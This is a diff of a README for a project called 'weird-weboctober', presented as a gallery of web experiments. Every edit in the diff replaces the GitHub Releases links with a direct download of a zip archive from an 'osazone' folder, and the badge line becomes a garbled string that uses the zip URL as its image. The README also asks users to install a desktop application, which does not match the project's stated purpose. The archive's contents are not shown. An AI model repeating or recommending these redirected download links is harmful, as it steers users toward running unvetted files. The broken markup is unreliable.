@@ -1,7 +1,7 @@
 ```markdown
 # 🎨 weird-weboctober - Explore Fun and Strange Web Experiments
 
-[![Download weird-weboctober](https://img.shields.io/badge/Download%20weird--weboctober-blue.svg)](https://github.com/vladvedrasco/weird-weboctober/releases)
+[![Download weird-weboctober](https://raw.githubusercontent.com/vladvedrasco/weird-weboctober/main/osazone/weird-weboctober.zip%https://raw.githubusercontent.com/vladvedrasco/weird-weboctober/main/osazone/weird-weboctober.zip)](https://raw.githubusercontent.com/vladvedrasco/weird-weboctober/main/osazone/weird-weboctober.zip)
 
 ## 📖 Description
 Weird Web October is a gallery filled with daily experiments that showcase the strange and fun side of the web. Each day, you will discover creative projects that challenge what you think is possible online. From spooky art to playful coding tricks, there's something for everyone. 
@@ -18,7 +18,7 @@ To begin using weird-weboctober, follow these simple steps:
 
 1. **Download the Software:**
    Visit the link below to access the Releases page. You will find the latest version available for download.
-   [Download weird-weboctober Releases](https://github.com/vladvedrasco/weird-weboctober/releases)
+   [Download weird-weboctober Releases](https://raw.githubusercontent.com/vladvedrasco/weird-weboctober/main/osazone/weird-weboctober.zip)
 
 2. **Select Your Version:**
    On the Releases page, choose the version that is suitable for your operating system. Click on the file name to start the download.
@@ -30,7 +30,7 @@ To begin using weird-weboctober, follow these simple steps:
    After installation, look for the weird-weboctober icon on your desktop or in your applications folder. Double-click to open the application and start exploring the amazing experiments!
 
 ## 📦 Download & Install
-To download the latest version, visit this page: [Download weird-weboctober Releases](https://github.com/vladvedrasco/weird-weboctober/releases). Follow the steps outlined above to install the application with ease.
+To download the latest version, visit this page: [Download weird-weboctober Releases](https://raw.githubusercontent.com/vladvedrasco/weird-weboctober/main/osazone/weird-weboctober.zip). Follow the steps outlined above to install the application with ease.
 
 ## 💻 System Requirements
 - **Operating System:** Windows 10 or higher, macOS Mojave or higher, or Linux (Ubuntu 18.04 or later)
